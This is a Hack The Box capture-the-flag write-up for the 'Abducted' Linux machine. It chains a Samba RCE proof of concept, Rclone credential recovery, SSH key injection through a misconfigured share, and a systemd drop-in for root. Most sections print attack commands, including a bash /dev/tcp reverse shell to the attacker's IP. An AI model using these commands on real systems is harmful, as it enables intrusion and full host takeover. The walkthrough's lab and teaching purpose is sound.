# Abducted - Hack The Box Writeup

**Category:** Linux  
**Difficulty:** Medium

---

# Enumeration

## Nmap

Initial scan revealed the following open ports:

```text
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```

The target appeared to be a Linux host exposing SMB services through Samba.

Samba is a free and open-source software suite that enables interoperability between Linux/Unix systems and Windows systems.

---

# SMB Enumeration

## Anonymous Access

I first checked whether anonymous SMB access was enabled.

Enumerating shares:

```bash
nxc smb 10.129.21.90 -u '' -p '' --shares
```

The output revealed write access to the following share:

```text
HP-Reception
```

---

# Initial Foothold

## CVE-2026-4480

One of the more recent vulnerabilities affecting Samba is:

```text
CVE-2026-4480
```

a critical remote code execution vulnerability.

From the Nmap output we knew the host was running:

```text
Samba 4
```

Although the exact version was unknown, it seemed highly likely that the challenge machine was vulnerable.

I used the public PoC:

```text
https://github.com/TheCyberGeek/CVE-2026-4480-PoC
```

and executed:

```bash
python3 exploit.py 10.129.21.90 10.10.14.170 4444 -P HP-Reception
```

This successfully provided a shell as:

```text
nobody
```

---

# Enumerating the System

While exploring the filesystem, I discovered an Rclone configuration file:

```text
/opt/offsite-backup/rclone.conf
```

Inside were credentials:

```text
svc-backup / HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

---

## Reviewing Backup Scripts

Reading the backup script:

```text
/opt/offsite-backup/sync.sh
```

showed that these credentials were being used with Rclone.

Using:

```bash
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

revealed the underlying password:

```text
iXzvcib3SrpZ
```

---

## User Enumeration

Checking for interactive users:

```bash
cat /etc/passwd | grep sh
```

revealed:

```text
marcus
scott
```

I tested the recovered password against both accounts.

The password worked for:

```text
scott
```

---

# User Access

Using SSH:

```bash
ssh scott@10.129.21.90
```

Password:

```text
iXzvcib3SrpZ
```

Successfully authenticated and obtained a shell as:

```text
scott
```

---

# Privilege Escalation to Marcus

## Samba Share Analysis

After further enumeration, I inspected the Samba share configuration:

```text
/etc/samba/shares.conf
```

The most interesting share was:

```text
[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```

---

## Interesting Configuration

### valid users

```text
valid users = scott
```

Only Scott can access the share.

---

### force user

```text
force user = marcus
```

All file operations performed through the share are executed as Marcus.

---

### wide links

```text
wide links = yes
```

Symlinks are allowed to point outside the share directory.

---

## Exploiting the Share Configuration

This configuration effectively allowed Scott to perform file operations as Marcus anywhere reachable through symlinks.

### Step 1: Create a Symlink

Inside the transfer directory:

```bash
cd /srv/transfer
ln -s /home/marcus marcus
```

This creates a symlink pointing to Marcus's home directory.

---

### Step 2: Generate SSH Keys

Generate a new SSH key pair:

```bash
ssh-keygen -t rsa -b 4096 -f marcus_key -N ""
```

---

### Step 3: Connect to the SMB Share

Access the share using Scott's credentials:

```bash
smbclient //10.129.21.90/transfer -U '10.129.21.90/scott%iXzvcib3SrpZ'
```

Because of the `force user` directive, all operations performed through this session will execute as Marcus.

---

### Step 4: Upload an Authorized Key

Inside the SMB session:

```text
cd marcus
mkdir .ssh
put marcus_key.pub authorized_keys
```

This writes the public key to:

```text
/home/marcus/.ssh/authorized_keys
```

---

### Step 5: SSH as Marcus

Using the generated private key:

```bash
ssh -i marcus_key marcus@10.129.21.90
```

Successfully obtained a shell as:

```text
marcus
```

---

# Privilege Escalation to Root

## Group Enumeration

Checking group memberships:

```bash
id
```

revealed that Marcus belonged to:

```text
operators
```

---

## Finding Writable Locations

Searching for files and directories owned by the operators group:

```bash
find / -group operators 2>/dev/null
```

revealed write access to:

```text
/etc/systemd/system/smbd.service.d
```

---

# Understanding the Opportunity

This directory is a:

```text
Systemd Drop-In Directory
```

for:

```text
smbd.service
```

the Samba daemon service.

Systemd drop-ins allow administrators to override or extend service configurations without modifying the original service file.

Any configuration placed in this directory is merged into the service definition when the service starts.

However, for any malicious configuration to take effect, the service must be restarted.

---

## Verifying Service Control

In a real-world engagement, it would generally be preferable to passively verify whether a service restart is possible, for example through PolicyKit enumeration.

However, since this is a CTF challenge, I simply tested whether I could reload and restart the service.

```bash
systemctl daemon-reload
systemctl restart smbd
```

Both commands executed successfully.

This confirmed that we could proceed with exploitation.

---

# Exploiting the Writable Drop-In Directory

## Step 1: Create a Malicious Override

Create a new drop-in configuration:

```bash
cat > /etc/systemd/system/smbd.service.d/root.conf << 'EOF'
[Service]
ExecStartPre=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.170/4444 0>&1 &"
EOF
```

This instructs systemd to execute a reverse shell before the Samba service starts.

---

## Step 2: Start a Listener

On the attacking machine:

```bash
nc -lnvp 4444
```

---

## Step 3: Reload Systemd

```bash
systemctl daemon-reload
```

---

## Step 4: Restart Samba

```bash
systemctl restart smbd
```

When Samba restarted, the malicious `ExecStartPre` directive executed.

---

# Root Shell

The reverse shell connected back to the listener and executed as:

```text
root
```

Root access obtained.

---

# Attack Chain Summary

```text
Anonymous SMB Access
        ↓
Writable HP-Reception Share
        ↓
CVE-2026-4480 (Samba RCE)
        ↓
Shell as nobody
        ↓
Recover Rclone Credentials
        ↓
Reveal Backup Password
        ↓
SSH Access as scott
        ↓
Misconfigured Samba Share
(force user + wide links)
        ↓
SSH Key Injection
        ↓
Shell as marcus
        ↓
operators Group Membership
        ↓
Writable systemd Drop-In Directory
        ↓
Ability to Restart smbd
        ↓
Malicious ExecStartPre
        ↓
Restart smbd
        ↓
ROOT
```

---

# Lessons Learned

* Anonymous SMB access should never be enabled unless absolutely necessary.
* Writable SMB shares can become dangerous attack vectors when combined with software vulnerabilities.
* Backup configurations often contain recoverable credentials.
* Credential reuse remains a common path to lateral movement and privilege escalation.
* Samba directives such as `force user` and `wide links` can introduce severe security risks when used together.
* SSH key injection is often a reliable privilege escalation technique when write access to a user's home directory is obtained.
* Membership in seemingly harmless administrative groups can expose powerful escalation opportunities.
* Writable systemd drop-in directories become extremely dangerous when the user can also restart the associated service.

---

# Personal Opinion

This machine was a great example of chaining together multiple independent weaknesses. The path from anonymous SMB access → Samba RCE → credential recovery → Samba share abuse → systemd service manipulation felt realistic and showcased how seemingly minor configuration mistakes can combine into complete system compromise.
